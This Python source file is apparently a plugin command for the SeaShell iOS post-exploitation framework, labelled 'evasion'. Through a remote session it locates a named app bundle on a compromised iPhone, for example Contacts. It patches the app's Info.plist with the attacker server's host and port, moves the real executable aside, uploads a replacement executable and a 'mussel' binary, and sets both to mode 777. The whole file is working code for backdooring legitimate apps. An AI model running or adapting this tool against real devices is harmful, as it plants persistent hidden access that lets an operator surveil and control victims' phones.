"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from pwny.api import *
from pwny.types import *

from seashell.lib.loot import Loot
from seashell.core.hook import Hook

from badges.cmd import Command


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "evasion",
            'Name': "hook",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Hook into other app (e.g. Contacts).",
            'Usage': "hook <app>",
            'MinArgs': 1
        })

        self.plist = Loot().specific_loot('Info.plist')

    def find_app(self, app_name):
        app_name += '.app'
        containers = '/private/var/containers/Bundle/Application'

        result = self.session.send_command(
            tag=FS_LIST,
            args={
                TLV_TYPE_PATH: containers
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to access application containers!")
            return

        self.print_process(f"Searching for {app_name} in containers...")
        file = result.get_tlv(TLV_TYPE_GROUP)
        path = None

        while file:
            apps = self.session.send_command(
                tag=FS_LIST,
                args={
                    TLV_TYPE_PATH: file.get_string(TLV_TYPE_PATH)
                }
            )

            if apps.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                continue

            app = apps.get_tlv(TLV_TYPE_GROUP)

            while app:
                if app.get_string(TLV_TYPE_FILENAME) == app_name:
                    path = app.get_string(TLV_TYPE_PATH)
                    self.print_success(f"Found {app_name} at {path}!")
                    break

                app = apps.get_tlv(TLV_TYPE_GROUP)

            if path:
                break

            file = result.get_tlv(TLV_TYPE_GROUP)

        return path

    def run(self, args):
        path = self.find_app(args[1])

        if not path:
            self.print_error(f"Path for {args[1]} not found!")
            return

        if not self.session.download(path + '/Info.plist', self.plist):
            self.print_error("Failed to access Info.plist!")
            return

        self.print_process("Patching Info.plist...")

        hook = Hook(host=self.session.device.server[0],
                    port=self.session.device.server[1])
        hook.patch_plist(self.plist)

        executable = hook.get_executable(self.plist)
        if not executable:
            self.print_error("Invalid executable path in Info.plist!")
            return
        self.print_information(F"Executable to replace: {executable}")

        if not self.session.upload(self.plist, path + '/Info.plist'):
            self.print_error("Failed to upload Info.plist!")
            return

        if self.session.send_command(
            tag=FS_FILE_MOVE,
            args={
                TLV_TYPE_FILENAME: '/'.join((path, executable)),
                TLV_TYPE_PATH: '/'.join((path, executable + '.hooked'))
            }
        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to move original executable!")
            return

        if not self.session.upload(hook.main, '/'.join((path, executable))):
            self.print_error("Failed to upload executable!")
            return

        if not self.session.upload(hook.mussel, '/'.join((path, 'mussel'))):
            self.print_error("Failed to upload mussel!")
            return

        self.print_process("Giving permissions to executable...")

        if self.session.send_command(
            tag=FS_CHMOD,
            args={
                FS_TYPE_MODE: 777,
                TLV_TYPE_PATH: '/'.join((path, executable)),
            }
        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(f"Failed to give permissions to executable!")
            return

        self.print_process("Giving permissions to mussel...")

        if self.session.send_command(
            tag=FS_CHMOD,
            args={
                FS_TYPE_MODE: 777,
                TLV_TYPE_PATH: '/'.join((path, 'mussel')),
            }
        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(f"Failed to give permissions to mussel!")
            return

        self.print_success(f"{args[1]} patched successfully!")
